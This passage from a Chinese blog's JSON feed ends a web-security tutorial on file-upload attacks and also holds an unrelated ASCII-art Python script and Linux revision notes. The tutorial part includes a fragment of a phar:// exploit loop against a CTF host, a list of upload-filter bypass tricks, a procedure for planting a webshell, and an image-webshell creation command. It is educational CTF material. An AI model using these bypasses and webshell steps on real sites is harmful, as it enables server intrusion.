xxxxxxxxxasdasf_flag.php');\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token operator\">-</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token operator\">+</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        url <span class=\"token operator\">=</span> <span class=\"token string\">'http://202.112.51.184:9005/index.php?page=phar://./uploads/'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.jpg/v'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        t<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">print</span> i</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">in</span> t<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">print</span> t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"其它方式绕过\"><a class=\"anchor\" href=\"#其它方式绕过\">#</a> 其它方式 — 绕过</h2>\n<h3 id=\"原理-5\"><a class=\"anchor\" href=\"#原理-5\">#</a> 原理</h3>\n<p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p>\n<h3 id=\"绕过方法-8\"><a class=\"anchor\" href=\"#绕过方法-8\">#</a> 绕过方法</h3>\n<pre><code class=\"language-txt\">1. 后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； \n例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】\n\n2. 双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如&quot;php&quot;字符串过滤的； \n例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个&quot;php&quot;字符串&quot;后，\n开头的’p’和结尾的’hp’就组合又形成了【php】。\n\n3. 特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； \n例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。\n</code></pre>\n<h1 id=\"常见web-server组合\"><a class=\"anchor\" href=\"#常见web-server组合\">#</a> 常见 web server 组合</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>x.asp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>windows server + asp + access  +  IIS</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>x.aspx</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>windows server + aspx + sql server  +  IIS</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>x.php</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Linux  + apache + php  + mysql </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>linux +  ngix  + php  + mysql </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>x.jsp  x.jspx</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Linux + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>windows server  + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr></table></figure><h1 id=\"文件上传检测流程\"><a class=\"anchor\" href=\"#文件上传检测流程\">#</a> 文件上传检测流程</h1>\n<h2 id=\"脑图-by-zksmile\"><a class=\"anchor\" href=\"#脑图-by-zksmile\">#</a> 脑图 【by zksmile】</h2>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h2>\n<ol>\n<li>\n<p>寻找上传点网站前台的上传点一般有头像上传、附件上传、证件认证上传。如果通过 SQL 注入或者其它一些技术手段得到网站后台权限，一般在网站更新页面的地方会存在上传点。也可以通过敏感目录或文件扫描工具扫到一些开源编辑器的测试上传页面等等。</p>\n</li>\n<li>\n<p>找到上传点之后，先上传一张正常的图片测试该上传点时候可用。</p>\n</li>\n<li>\n<p>上传一张正常的图片，抓包修改文件后缀名为对应网站脚本语言。<br />\n该操作可以绕过前端检测、MIME 检测、文件内容检测，可以检测出网站是否对上传文件进行了文件后缀名的检测。<br />\n如果上传成功表示没有对文件后缀进行检测，可以进一步上传图片马，抓包修改文件后缀为对应网站脚本语言即可获取 webshell.<br />\n 如果上传失败表示对文件名后缀进行了检测，需要进一步判断是黑名单检测还是白名单检测。</p>\n</li>\n<li>\n<p>上传一张正常的图片，在它后缀随便添加几个字符进行上传。<br />\neg: &quot;1jpgaaaaa&quot; 该后缀的文件既不在黑名单之内也不在白名单之内，如果文件上传成功代表是黑名单检测，如果上传失败代表是白名单检测。</p>\n</li>\n<li>\n<p>黑名单检测绕过</p>\n<ul>\n<li>文件名大小写绕过</li>\n<li>特殊文件名绕过<br />\n后缀加上：\n<ul>\n<li>::$DATA（目标环境在 Windows 下）</li>\n<li>空格和点 (.)，或空格和点的组合（目标环境在 Windows 下）<br />\n碰到过滤文件名的</li>\n<li>双写文件名 pphphp</li>\n</ul>\n</li>\n<li>0x00 截断绕过</li>\n<li>.htaccess 文件攻击</li>\n<li>php 文件包含漏洞</li>\n<li>Apache 解析漏洞</li>\n<li>Nginx 解析漏洞</li>\n</ul>\n</li>\n<li>\n<p>白名单检测绕过</p>\n<ul>\n<li>0x00 截断绕过</li>\n<li>是否暴露保存路径，保存路径截断，或修改</li>\n<li>php 文件包含漏洞</li>\n<li>IIS 解析漏洞</li>\n<li>Nginx 解析漏洞</li>\n</ul>\n</li>\n</ol>\n<p>图片马制作</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>copy <span class=\"token number\">1</span>.png/b + payload.* <span class=\"token number\">2</span>.png</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/A           表示 ASCII 文本文件。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/B           表示二进制文件。</pre></td></tr></table></figure>",
            "tags": [
                "web安全",
                "文件上传"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/12/Python-converts-pictures-into-character-drawings/",
            "url": "https://self-ferry.github.io/2021/01/12/Python-converts-pictures-into-character-drawings/",
            "title": "Python converts pictures into character drawings",
            "date_published": "2021-01-12T09:44:20.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>看到一个非常有趣的 python 脚本，可以把图片生成对应的字符画。</p>\n<h2 id=\"code\"><a class=\"anchor\" href=\"#code\">#</a> Code</h2>\n<div class=\"note primary\">\n<p><strong>USAGE</strong><br />\npython <span class=\"exturl\" data-url=\"aHR0cDovL3BpYy1zdHIucHk=\">pic-str.py</span> xxx.jpg --width 200 --height 200 -o xxx.txt</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># coding:utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> argparse</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 命令行输入参数处理</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输入文件</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-o'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--output'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出文件</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--width'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">140</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出字符画宽</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--height'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">90</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出字符画高</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 获取参数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>IMG <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span><span class=\"token builtin\">file</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>WIDTH <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>width</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>HEIGHT <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>height</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># OUTPUT = args.output # 输出到文件</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ascii_char <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;>i!lI;:,\\\"^`'. \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># 将 256 灰度映射到 70 个字符上</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_char</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> alpha<span class=\"token operator\">=</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> alpha <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">' '</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ascii_char<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    gray <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.2126</span> <span class=\"token operator\">*</span> r <span class=\"token operator\">+</span> <span class=\"token number\">0.7152</span> <span class=\"token operator\">*</span> g <span class=\"token operator\">+</span> <span class=\"token number\">0.0722</span> <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">256.0</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> length</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> ascii_char<span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gray <span class=\"token operator\">/</span> unit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    im <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>IMG<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    im <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>WIDTH<span class=\"token punctuation\">,</span> HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Image<span class=\"token punctuation\">.</span>NEAREST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    txt <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>WIDTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            txt <span class=\"token operator\">+=</span> get_char<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>im<span class=\"token punctuation\">.</span>getpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        txt <span class=\"token operator\">+=</span> <span class=\"token string\">'\\n'</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>txt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token comment\"># # 字符画输出到文件</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token comment\"># if OUTPUT:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">#     with open(OUTPUT, 'w') as f:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">#         f.write(txt)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token comment\"># else:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token comment\">#     with open(\"output.txt\", 'w') as f:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token comment\">#         f.write(txt)</span></pre></td></tr></table></figure><h2 id=\"结果展示\"><a class=\"anchor\" href=\"#结果展示\">#</a> 结果展示</h2>\n<p>非常可爱的一只小熊猫。我在画图工具里，把字符保存为了图片。</p>\n<p><img data-src=\"100.png\" alt=\"\" /></p>\n<p><img data-src=\"200.png\" alt=\"\" /></p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2020/12/31/Linux-Reviewing/",
            "url": "https://self-ferry.github.io/2020/12/31/Linux-Reviewing/",
            "title": "Linux-Reviewing",
            "date_published": "2020-12-31T11:23:08.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>学校提前放假，期末考试也提前了。没办法赶紧复习！(ಥ_ಥ)</p>\n<h1 id=\"基础\"><a class=\"anchor\" href=\"#基础\">#</a> 基础</h1>\n<h2 id=\"linux是谁开发的-是用什么语言开发的-unix的开源精神\"><a class=\"anchor\" href=\"#linux是谁开发的-是用什么语言开发的-unix的开源精神\">#</a> Linux 是谁开发的、是用什么语言开发的、Unix 的开源精神</h2>\n<p>1991 年 Linus Torvalds（林纳斯。托瓦兹）写出 Linux 内核的第一个版本；<br />\n1992 年第一个发行版出现；<br />\nGNU/Linux 系统 = Linux 内核 + GNU；发行版有：Red Hat,Debain,Suse,Mandrake,Redflag...<br />\nGNU：即革奴计划，由理查德。斯托曼发起，目标是创建一套完全自由的操作系统；<br />\n其他：EMACS、Copyleft</p>\n<h2 id=\"mbr简介\"><a class=\"anchor\" href=\"#mbr简介\">#</a> MBR 简介</h2>\n<p>一块硬盘最多拥有 4 个主分区 (包括扩展分区)。这是</p>\n<p>ps: 44 页前</p>\n<h1 id=\"linux下的shell相关的操作\"><a class=\"anchor\" href=\"#linux下的shell相关的操作\">#</a> Linux 下的 shell 相关的操作</h1>\n<p>shell 是 Linux 系统的一个重要组成部分。在 Linux 系统中，shell 就是一组介于用户与 Linux 内核之间的系统程序。shell 是用户与 Linux 内核之间的接口。</p>\n<h2 id=\"shell的分类\"><a class=\"anchor\" href=\"#shell的分类\">#</a> shell 的分类</h2>\n<p>hell 有着不同的分类，比如 Bourne shell（sh），Korn shell（ksh）、C shell （csh）、Bourne-again shell（bash）、tcsh。其中最常用的有 csh 和 bash，其提示符如下：<br />\nsh–Bash ：#root $user<br />\ncsh–:#root %user</p>\n<h2 id=\"简单的shell命令\"><a class=\"anchor\" href=\"#简单的shell命令\">#</a> 简单的 shell 命令</h2>\n<p>Linux 命令又称 shell 命令。</p>\n<h3 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h3>\n<p>命令名 【选项】 【参数】</p>\n<p>命令行输入的第一个字必须是一个命令的名字，第二个字是明明令的选项或参数，命令行中的每个字必须有空格隔开。【选项】的方括号表示语法上选项是可有可无的。选项旺旺包括一个或多个英文字母，在字母前面必须有一个减号【减号是必须的，Linux 用它来区分选项和参数，参数是不带减号的】</p>\n<h3 id=\"pwd\"><a class=\"anchor\" href=\"#pwd\">#</a> pwd</h3>\n<p>格式：pwd（print work directory 缩写）</p>\n<p>功能：显示当前目录的绝对路径。</p>\n<h3 id=\"cd\"><a class=\"anchor\" href=\"#cd\">#</a> cd</h3>\n<p>格式：cd 【目录】<br />\n功能：切换到指定目录。</p>\n<p>‘charge directory’的缩写</p>\n<p>cd ../   返回到上一级目录<br />\n cd      不带任何参数表示返回到家目录<br />\n cd -    <em><strong>返回上一个目录</strong></em>。</p>\n<h3 id=\"ls\"><a class=\"anchor\" href=\"#ls\">#</a> ls</h3>\n<p>格式：ls 【选项】 【文件 | 目录】<br />\n功能：显示指定目录下的内容。内容包括该目录下的文件和子目录。当不指定目录时，默认显示当前面目录下中的文件和子目录信息。‘list’的缩写。</p>\n<p>主要选项：<br />\n-a 显示所有文件和子目录，包括隐藏文件和隐藏自子目录。Linux 下的隐藏文件和隐藏子目录以‘.’开头。<br />\n-l 显示文件和子目录详细信息，即以长格式显示，包括文件类型、权限、拥有人和拥有组、文件大小、最近一次修改时间、文件名等信息。<br />\n-d 参数应该是目录，只显示目录的信息，而不显示其中所包含的文件机子目录的信息，该选项通常与‘-l’一起使用，后接目录名，功能是以长格式显示目录信息。<br />\n-R 不仅显示指定目录下的文件和子目录信息，而且还递归地显示各子路录下的文件和子目录信息。<br />\n-t 按照时间顺序显示文件，新的文件排在前面。ls 命令默认按照字母顺序排列。<br />\n--help 查看帮助信息。</p>\n<h3 id=\"date\"><a class=\"anchor\" href=\"#date\">#</a> date</h3>\n<p>格式：date【+FORMAT】 或 date 【MMDDhhmm【YY】【YYYY】】<br />\n功能：查看或修改系统时间。</p>\n<p>date 命令显示的内容依次是星期、月份、小时、分钟、秒、时区和年份。</p>\n<h3 id=\"cal\"><a class=\"anchor\" href=\"#cal\">#</a> cal</h3>\n<p>格式：cal【YYYY】<br />\n功能：显示日历<br />\n显示本月的日历。若参数为年份，则显示该年的日历。</p>\n<h3 id=\"who\"><a class=\"anchor\" href=\"#who\">#</a> who</h3>\n<p>格式：who<br />\n 功能：显示当前已登录到系统的所有用户名及其终端名和登录到系统的时间。</p>\n<h3 id=\"clear\"><a class=\"anchor\" href=\"#clear\">#</a> clear</h3>\n<p>格式：clear<br />\n 功能：清楚当前终端的屏幕内容。<br />\n也可以使用快捷组合键 Ctrl + L</p>\n<h2 id=\"获取帮助\"><a class=\"anchor\" href=\"#获取帮助\">#</a> 获取帮助</h2>\n<h3 id=\"whatis\"><a class=\"anchor\" href=\"#whatis\">#</a> whatis</h3>\n<p>格式：whatis 命令名<br />\n功能： 查询某命令的简单功能。</p>\n<p>但该命令信息量较少，且该命令是基于数据库的查询，对于刚安装的命令则查询不到，等到系统更新后才能查到。若要立即查询，则使用 makewhatis 立即生效更新数据库，然后再用该命令进行查询。</p>\n<h3 id=\"-help\"><a class=\"anchor\" href=\"#-help\">#</a> --help</h3>\n<p>格式： 命令名 --help<br />\n 功能：显示指定命令的帮助信息。</p>\n<h3 id=\"man\"><a class=\"anchor\" href=\"#man\">#</a> man</h3>\n<p>格式：man 命令名<br />\n功能：显示指定命令的手册页帮助信息。</p>\n<h3 id=\"info\"><a class=\"anchor\" href=\"#info\">#</a> info</h3>\n<p>格式：info 命令名<br />\n功能：查询命令的用法合作文件的格式。</p>\n<h3 id=\"usrsharedoc\"><a class=\"anchor\" href=\"#usrsharedoc\">#</a> /usr/share/doc</h3>\n<p>帮助文档就位于 /usr/share/doc 目录下。</p>\n<p>以上获取帮助的方法，man 命令是最常使用的。</p>\n<h2 id=\"bash变量\"><a class=\"anchor\" href=\"#bash变量\">#</a> bash 变量</h2>\n<h3 id=\"变量的设置与引用\"><a class=\"anchor\" href=\"#变量的设置与引用\">#</a> 变量的设置与引用</h3>\n<p>变量名 = 值</p>\n<p>引用格式为 “<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>变量名”或者“</mtext></mrow><annotation encoding=\"application/x-tex\">变量名”或者“</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">或</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord\">“</span></span></span></span>{变量名}”，一般情况下可以不用加大括号，但有些情况下必须要加大括号。</p>\n<p>echo $Atest  将 Atest 当作一个变量；<br />\necho ${A} test  test 将在变量 A 之后。</p>\n<h3 id=\"环境变量\"><a class=\"anchor\" href=\"#环境变量\">#</a> 环境变量</h3>\n<p>系统中影响到 bash 环境的变量被称为环境变量。可以使用 env 或 export 来查阅系统默认的环境变量。</p>\n<p>常用的环境变量</p>\n<ol>\n<li>\n<p>PS1: 系统提示符环境变量。</p>\n</li>\n<li>\n<p>HISTSIZE: 默认保存的历史记录数。</p>\n</li>\n<li>\n<p>PATH: 执行文件查找的路径。<br />\nPATH 的值都是一些目录，目录与目录之间以冒号（:）分隔，由于文件的查找是依序有 PATH 变量内的目录来查找的，所以目录的顺序也很重要。</p>\n</li>\n<li>\n<p>USER: 当前登录的用户。</p>\n</li>\n<li>\n<p>HOME: 当前用户的家目录。</p>\n</li>\n<li>\n<p>EUID: 当前用户的 UID</p>\n</li>\n</ol>\n<h2 id=\"与shell有关的配置文件\"><a class=\"anchor\" href=\"#与shell有关的配置文件\">#</a> 与 shell 有关的配置文件</h2>\n<ol>\n<li>\n<p>/etc/profile 文件、这是系统最重要的 shell 配置文件，也是用户登录系统最先检查的文件，系统的环境变量多定义在此文件中，主要包括 PATH、USER、LANG、MAIL、HOSTNAME、HISTSIZE 和 INPUTRC。</p>\n</li>\n<li>\n<p>~/.bash_profile 文件。每个用户的 bash 环境配置文件，存在于用户目录的家目录下，当系统运行 /etc/profile/ 后，将读取此文件的内容，此文件定义了 USER、EUID、HOME、PATH 等环境变量，此处的 PATH 包括了用户自己定义的路径以及用户的 “bin” 路径</p>\n</li>\n<li>\n<p>~/.bashrc 文件。 前两个文件仅在系统登录时读取。此文件在每次运行 bash 是读取，此文件主要定义的是一些终端设置以及 Shell 提示符等。而不定义环境变量等内容。</p>\n</li>\n<li>\n<p>~/.bash_history 文件。该文件保存了用户的历史记录。</p>\n</li>\n</ol>\n<h2 id=\"历史记录命令\"><a class=\"anchor\" href=\"#历史记录命令\">#</a> 历史记录命令</h2>\n<p>可以利用上下方向键调出已经执行过的 Shell 命令。</p>\n<p>还可以用 history 命令查看 Shell 命令的历史记录</p>\n<p>格式：history【数字】<br />\n功能：查看 Shell 命令的历史记录。如果指定参数则查看最近执行过的指定个数的 Shell 命令</p>\n<p>还有 '!' 也可以调出一执行过的 Shell 命令。<br />\n格式：! 序号<br />\n功能：执行指定序号的 Shell 命令，‘!’ 后面也可以跟字符串来调用已执行过的以该字符串开头的 Shell 命令。</p>\n<p>~<br />\n<font color=\"red\">在 ContOS7 上不知道为什么不能用 '!' 命令，man 命令提示没有 '!' 命令手册</font><br />\n~<br />\n 原来是感叹号与后面的的序号之间没有空格。</p>\n<p>!! 是执行上一条命令</p>\n<h2 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h2>\n<p>* : 通配 0 个或多个字符</p>\n<p>？ ：通配任意单个字符</p>\n<p><code>* ？ [] - !</code>  可以组成字符组。</p>\n<p>例子：</p>\n<p>ls *.png 列出所有 PNG 图片</p>\n<p>ls a?    列出首字母是 a, 文件名只有两个字符的所有文件</p>\n<p>ls [abc]* 列出首字母是 a、b、c 的所有文件</p>\n<h2 id=\"别名\"><a class=\"anchor\" href=\"#别名\">#</a> 别名</h2>\n<p>格式： alinas 【别名 =‘标准 Shell 命令行’】<br />\n功能：查看和设置别名</p>\n<p>不加参数时查看别名。</p>\n<h2 id=\"去除特殊符号的意义\"><a class=\"anchor\" href=\"#去除特殊符号的意义\">#</a> 去除特殊符号的意义</h2>\n<p>Linux 系统中有许多符号具有特殊的含义。如！表示去历史记录，$ 表示取变量的值，`` 反引号表示取命令的执行结果，等等。</p>\n<p>三种方法可以去除特殊符号的意义</p>\n<ol>\n<li>反斜杠 \\</li>\n<li>单引号 ('') 使任何特殊字符都不转义，原样输出。</li>\n<li>双引号 (&quot;&quot;) 只有以下四种情况下会转义：<br />\n$(美元符号)-- 取变量的值；<br />\n``(反引号)-- 命令替换；<br />\n\\(反斜杠)-- 单个字符禁止（转义）；<br />\n!(感叹号)-- 历史命令替换。</li>\n</ol>\n<h2 id=\"重定向\"><a class=\"anchor\" href=\"#重定向\">#</a> 重定向</h2>\n<p>Linux 系统中通常利用键盘输入数据，命令执行结果输出到屏幕上。也就是说 Linux 的默认标准输入时键盘，默认标准输出和标准错误输出都是屏幕。<br />\nShell 中，不使用系统默认的输入输出端口，而是重新指定至文件的情况称为重定向。</p>\n<h3 id=\"输出重定向\"><a class=\"anchor\" href=\"#输出重定向\">#</a> 输出重定向</h3>\n<p>输出重定向就是命令的执行结果不显示在标准输出（屏幕）上，而是保存到某一文件中的操作，利用符号 “&gt;” 